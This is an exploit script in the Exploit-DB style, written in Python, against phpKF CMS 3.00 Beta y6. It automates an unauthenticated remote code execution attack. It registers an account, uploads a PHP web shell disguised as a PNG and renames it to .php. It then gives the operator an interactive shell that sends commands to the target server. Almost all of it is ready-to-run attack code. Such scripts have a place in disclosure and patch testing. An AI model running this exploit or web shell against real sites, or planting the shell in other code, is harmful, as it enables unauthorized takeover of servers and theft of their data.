# Exploit Title: phpKF CMS 3.00 Beta y6 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 18/12/2021
# Exploit Author: Halit AKAYDIN (hLtAkydn)
# Vendor Homepage: https://www.phpkf.com/
# Software Link: https://www.phpkf.com/indirme.php
# Version: 3.00
# Category: Webapps
# Tested on: Linux/Windows

# phpKF-CMS; It is a very popular content management system for promotion, news, shopping, corporate, friends, blogs and more.
# Contains an endpoint that allows remote access
# Necessary checks are not made in the file upload mechanism, only the file extension is checked
# The file with the extension ".png" can be uploaded and the extension can be changed.


# Example: python3 exploit.py -u http://example.com
#		   python3 exploit.py -u http://example.com -l admin -p Admin123


from bs4 import BeautifulSoup
from time import sleep
import requests
import argparse
import json

def main():
	parser = argparse.ArgumentParser(description='phpKF-CMS 3.00 Beta y6 - Remote Code Execution (Unauthenticated)')
	parser.add_argument('-u', '--host', type=str, required=True)
	parser.add_argument('-l', '--login', type=str, required=False)
	parser.add_argument('-p', '--password', type=str, required=False)
	args = parser.parse_args()
	print("\nphpKF-CMS 3.00 Beta y6 - Remote Code Execution (Unauthenticated)",
		  "\nExploit Author: Halit AKAYDIN (hLtAkydn)\n")
	host(args)


def host(args):
	#Check http or https
	if args.host.startswith(('http://', 'https://')):
		print("[?] Check Url...\n")
		sleep(2)
		args.host = args.host
		if args.host.endswith('/'):
			args.host = args.host[:-1]
		else:
			pass
	else:
		print("\n[?] Check Adress...\n")
		sleep(2)
		args.host = "http://" + args.host
		args.host = args.host
		if args.host.endswith('/'):
			args.host = args.host[:-1]
		else:
			pass


	# Check Host Status
	try:
		response = requests.get(args.host)
		if response.status_code == 200:
			if args.login == None and args.password == None:
				create_user(args)
			else:
				login_user(args)
		else:
			print("[-] Address not reachable!")
			sleep(2)

	except requests.ConnectionError as exception:
		print("[-] Address not reachable!")
		sleep(2)
		exit(1)


def create_user(args):
	print("[*] Create User!\n")
	sleep(2)
	url = args.host + "/phpkf-bilesenler/kayit_yap.php"
	headers = {
			"Origin": args.host,
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
			"Referer": "http://fuzzing.com/uye-kayit.php",
			"Accept-Encoding": "gzip, deflate"
	}
	data = {
			"kayit_yapildi_mi": "form_dolu",
			"oturum": '', "kullanici_adi": "evil",
			"sifre": "Evil123",
			"sifre2": "Evil123",
			"posta": "evil@localhost.com",
			"kosul": "on"
	}
	response = requests.post(url, headers=headers, data=data, allow_redirects=True)
	args.login = ("evil")
	args.password = ("Evil123")
	print("[+] " + args.login + ":" + args.password + "\n")
	sleep(2)
	login_user(args)



def login_user(args):
	url = args.host + "/uye-giris.php"
	headers = {
			"Origin": args.host,
			"Content-Type": "application/x-www-form-urlencoded",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"Referer": args.host + "/uye-giris.php",
			"Accept-Encoding": "gzip, deflate"
	}
	data = {
			"kayit_yapildi_mi": "form_dolu",
			"git": args.host + "/index.php",
			"kullanici_adi": args.login,
			"sifre": args.password,
			"hatirla": "on"
	}
	response = requests.post(url, headers=headers, data=data, allow_redirects=False)
	token = response.cookies.get("kullanici_kimlik")
	if (token != None):
		print("[!] Login Success!\n")
		sleep(2)
		upload_evil(args, token)
	else:
		if args.login == "evil" and args.password == "Evil123":
			print("[!] Unauthorized user!\n")
			print("[!] manually add a user and try again\n")
			print("[!] Go to link " + args.host + "/uye-kayit.php\n")
			print("python3 exploit.py -u '"+ args.host +"' -l 'attacker' -p 'p@ssW0rd'")
			sleep(2)
		else:
			print("[!] Unauthorized user!\n")
			sleep(2)


def upload_evil(args, token):
	url = args.host + "/phpkf-bilesenler/yukleme/index.php"
	cookies = {
			"kullanici_kimlik": token,
			"dil": "en"
	}
	headers = {
			"VERICEK": "",
			"DOSYA-ADI": "evil.png",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded; charset=utf-8",
			"Accept": "*/*",
			"Origin": args.host,
			"Referer": args.host + "/oi_yaz.php",
			"Accept-Encoding": "gzip, deflate"
	}
	data = "<?php if(isset($_GET['cmd'])){ $cmd = ($_GET['cmd']); system($cmd); die; } ?>"
	response = requests.post(url, headers=headers, cookies=cookies, data=data)

	if (response.text == "yuklendi"):
		print("[!] Upload Success!\n")
		sleep(2)
		change_name(args, token)
	else:
		print("[!] Upload Failed!\n")
		sleep(2)


def change_name(args, token):
	url = args.host + "/phpkf-bilesenler/yukleme/index.php"
	cookies = {
			"kullanici_kimlik": token,
			"dil": "en"
	}
	headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"Accept": "*/*",
			"Origin": args.host,
			"Referer": args.host + "/oi_yaz.php",
			"Accept-Encoding": "gzip, deflate"
	}
	data = {
			"yenidenadlandir": "evil.png|evil.php",
			"vericek": "/"
	}
	response = requests.post(url, headers=headers, cookies=cookies, data=data)
	if (response.text == "Name successfully changed..."):
		print("[!] Change Name evil.php!\n")
		sleep(2)
		find_dict(args, token)
	else:
		print("[!] Change Failed!\n")
		sleep(2)

def find_dict(args, token):
	url = args.host + "/phpkf-bilesenler/yukleme/index.php"
	cookies = {
			"kullanici_kimlik": token,
			"dil": "en"
	}
	headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"Accept": "*/*",
			"Origin": args.host,
			"Referer": args.host + "/oi_yaz.php",
			"Accept-Encoding": "gzip, deflate"
	}
	data = {
			"vericek": "/",
			"dds": "0"
	}
	response = requests.post(url, headers=headers, cookies=cookies, data=data)
	if (response.text == "You can not upload files!"):
		print("[!] File not found!\n")
		sleep(2)
	else:
		print("[!] Find Vuln File!\n")
		sleep(2)
		soup = BeautifulSoup(response.text, 'html.parser')
		path = soup.find("div").contents[1].replace(" ", "")
		exploit(args, path)


def exploit(args, path):
	print("[+] Exploit Done!\n")
	sleep(2)

	while True:
		cmd = input("$ ")
		url = args.host + path + "evil.php?cmd=" + cmd
		headers = {
			"Upgrade-Insecure-Requests": "1",
			"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"
		}

		response = requests.post(url, headers=headers, timeout=5)

		if response.text == "":
			print(cmd + ": command not found\n")
		else:
			print(response.text)


if __name__ == '__main__':
	main()